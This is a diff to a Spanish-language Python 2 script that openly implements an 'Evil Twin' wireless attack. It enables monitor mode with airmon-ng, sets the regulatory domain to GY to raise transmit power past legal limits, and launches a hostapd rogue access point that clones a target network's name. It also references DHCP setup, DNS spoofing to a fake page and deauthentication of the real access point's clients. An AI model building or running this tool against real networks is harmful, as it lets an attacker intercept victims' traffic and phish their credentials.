@@ -73,6 +73,10 @@ def chose_iface(interface):
     return target_interface
 
 def monitor_iface(target_interface):
+    interface_list = netifaces.interfaces()
+    while target_interface not in interface_list:
+        print "La interface %s no existe" % (target_interface)
+        sys.exit()
     os.system("airmon-ng start %s 1>/dev/null" % (target_interface))
     interface = str(target_interface)+'mon'
     return interface
@@ -88,7 +92,8 @@ def iface_txpower(interface,args):
             os.system("iwconfig %s txpower 30" % (interface))
         elif target_txpower == 'n':
             pass
-    if args.txpower != None and args.mode != "interactivo":
+    else:
+        #print "iface_txpower args"
         os.system("ifconfig %s down" % (interface))
         os.system("iw reg set GY") #GY o BO
         os.system("ifconfig %s up" % (interface))
@@ -161,7 +166,7 @@ def run_rogueAP(interface,channel,essid):
                   'driver=nl80211',
                   'ssid='+essid,
                   'hw_mode=g',
-                  'channel='+channel,
+                  'channel='+str(channel),
                   'macaddr_acl=0',
                   'ignore_broadcast_ssid=0'
                  ]
@@ -183,7 +188,8 @@ def rogueAP(interface,channel,essid):
             target_channel = raw_input('Canal incorrecto, intenta de nuevo: ')
         run_rogueAP(interface,target_channel,essid)
     else:
-        pass
+        print "run_rogueAP in args or file mode"
+        run_rogueAP(interface,channel,essid)
 
 def dnssnoof(interface):
     p = subprocess.Popen(["xterm", "-e", "dnssnoof", "-i", interface])
@@ -239,7 +245,6 @@ def use_mode(args):
             # Llamamos a la funcion desAuthentication()
             desAuthentication(interface,bssid)
 
-
         if args.mode == "file":
             pass
     elif args.mode == "args":
@@ -252,23 +257,109 @@ def use_mode(args):
         last_ip   = args.last_ip
         mask      = args.mask
         gateway   = args.gateway
+        print args
+        # Modo monitor
+        interface = monitor_iface(interface)
+        if txpower != None:
+            iface_txpower(interface,args)
+        # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
+        rogueAP(interface,channel,essid)
+
+        '''
+        Falta hacer ajustes
+        # Llamamos a la funcio conf_dnsmasq() para crear DHCP que usara RogueAP
+        conf_dnsmasq(args,interface,first_ip,last_ip,mask,gateway)
+        # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
+        dnssnoof(interface)
+        # Llamamos a la funcion desAuthentication()
+        desAuthentication(interface,bssid)
+        '''
+
     else:
         print "\nElige un modo de uso corecto:\n\t[interactivo, args , file]"
     return interface,bssid,essid,channel,txpower,first_ip,last_ip,mask,gateway
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
-    parser.add_argument('-mode' , '--use-mode'  , dest='mode'      , type=str, required=True,  choices=['interactivo','args','file'] ,help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
-    parser.add_argument('-i'    , '--interface' , dest='interface' , type=str, required=False, help='Interface to use for sniffing and packet injection')
-    parser.add_argument('-bssid', '--bssid'     , dest='bssid'     , type=str, required=False, help='Direccion MAC del AP')
-    parser.add_argument('-essid', '--essid'     , dest='essid'     , type=str, required=False, help='Nombre de la red inalambrica')
-    parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int, required=False, choices=range(1,16) ,help='Canal del AP ')
-    parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int, required=False, choices=range(20,31,10), help='Potencia de la antena')
-    parser.add_argument('-f_ip' , '--first_ip'  , dest='first_ip'  , type=str, required=False, help='Primer IP del pool DHCP')
-    parser.add_argument('-l_ip' , '--last_ip'   , dest='last_ip'   , type=str, required=False, help='Ultima IP del pool DHCP')
-    parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str, required=False, help='Mascara')
-    parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str, required=False, help='Gateway')
+def use():
+    print "Use: %s [opciones]" % __file__
+    print ""
+    print "   -cdb,   --cdb         Creara la base de datos"
+    print ""
+    print "Ejemplo:    %s -cdb" % __file__
+    print ""
+    print "   -cdb,   --ddb         Borra la base de datos"
+    print ""
+    print "Ejemplo:    %s -ddb" % __file__
+    print ""
+    print "   -mode,   --mode         Modos de uso [interactivo, arg y file]"
+    print ""
+    print "---- interactivo ----\n"
+    print "Ejemplo:    %s -mode interactivo" % __file__
+    print ""
+    print "---- file ----\n"
+    print "Ejemplo:    %s -mode -file <Nombre del archivo>" % __file__
+    print ""
+    print "---- args ----\n"
+    print "   -i,     --interface    Interface de red inalambrica a utilizar."
+    print "   -bssid, --bssid        Direccion MAC de AP a clonar"
+    print "   -essid, --essid        Nombre del AP a clonar"
+    print "   -c,     --channel      Canal que ocupara la antena inalambrica"
+    print "   -p,     --txpower      Potencia de la antena [unicamente 30 :(]"
+    print "   -f_ip,  --first_ip     Primer IP del pool DHCP"
+    print "   -l_ip,  --last_ip      Ultima IP del pool DHCP"
+    print "   -m,     --mask         Mascara de red"
+    print "   -g,     --gateway      Gateway a utilizar"
+    print ""
+    print "Ejemplo:  %s -mode args -i <interface> -bssid <FF:FF:FF:FF:FF:FF> -essid <RougeAP> ..." % __file__
 
-    args = parser.parse_args()
-    use_mode(args)
-    #os.system('airmon-ng stop %s' %(interface))
+if __name__ == "__main__":
+    if '-cdb' in str(sys.argv) and len(sys.argv) == 2:
+        print "Creando base de datos..."
+        #c_database()
+    elif '-ddb' in str(sys.argv) and len(sys.argv) == 2:
+        print "Borrando base de datos"
+        #d_database()
+    elif '-mode' in str(sys.argv) and 'interactivo' in str(sys.argv)and len(sys.argv) == 3:
+        print "Mode: Interactivo"
+        parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
+        parser.add_argument('-mode' , '--use-mode'  , dest='mode'      , type=str, required=False, default='interactivo' ,help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
+        '''
+        parser.add_argument('-i'    , '--interface' , dest='interface' , type=str, required=False, help='Interface to use for sniffing and packet injection')
+        parser.add_argument('-bssid', '--bssid'     , dest='bssid'     , type=str, required=False, help='Direccion MAC del AP')
+        parser.add_argument('-essid', '--essid'     , dest='essid'     , type=str, required=False, help='Nombre de la red inalambrica')
+        parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int, required=False, choices=range(1,16) ,help='Canal del AP ')
+        parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int, required=False, choices=range(20,31,10), help='Potencia de la antena')
+        parser.add_argument('-f_ip' , '--first_ip'  , dest='first_ip'  , type=str, required=False, help='Primer IP del pool DHCP')
+        parser.add_argument('-l_ip' , '--last_ip'   , dest='last_ip'   , type=str, required=False, help='Ultima IP del pool DHCP')
+        parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str, required=False, help='Mascara')
+        parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str, required=False, help='Gateway')
+        '''
+        args = parser.parse_args()
+
+        use_mode(args)
+        #os.system('airmon-ng stop %s' %(interface))
+
+    elif '-mode' in str(sys.argv) and 'args' in str(sys.argv) and len(sys.argv) > 4:
+        print "Mode: args"
+        parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
+        parser.add_argument('-mode' , '--use-mode'  , dest='mode'      , required=False, default='args', help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
+        parser.add_argument('-i'    , '--interface' , dest='interface' , type=str, required=True,  help='Interface to use for sniffing and packet injection')
+        parser.add_argument('-bssid', '--bssid'     , dest='bssid'     , type=str, required=False, help='Direccion MAC del AP')
+        parser.add_argument('-essid', '--essid'     , dest='essid'     , type=str, required=True, help='Nombre de la red inalambrica')
+        parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int, required=True, choices=range(1,16) ,help='Canal del AP ')
+        parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int, required=False, choices=range(20,31,10), help='Potencia de la antena')
+        parser.add_argument('-f_ip' , '--first_ip'  , dest='first_ip'  , type=str, required=False, help='Primer IP del pool DHCP')
+        parser.add_argument('-l_ip' , '--last_ip'   , dest='last_ip'   , type=str, required=False, help='Ultima IP del pool DHCP')
+        parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str, required=False, help='Mascara')
+        parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str, required=False, help='Gateway')
+        args = parser.parse_args()
+        use_mode(args)
+
+    elif '-mode' in str(sys.argv) and 'file' in str(sys.argv)and len(sys.argv) == 4:
+        parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
+        parser.add_argument('-mode' , '--mode'  , dest='mode', required=False, action='store_true', help='Archivo del cual se tomara la configuracon a implemetar')
+        parser.add_argument('-file' , '--file'  , dest='file', type=str, required=True, help='Archivo del cual se tomara la configuracon a implemetar')
+        args = parser.parse_args()
+        print "Mode: Archivo"
+        #use_mode(args)
+    else:
+        use()
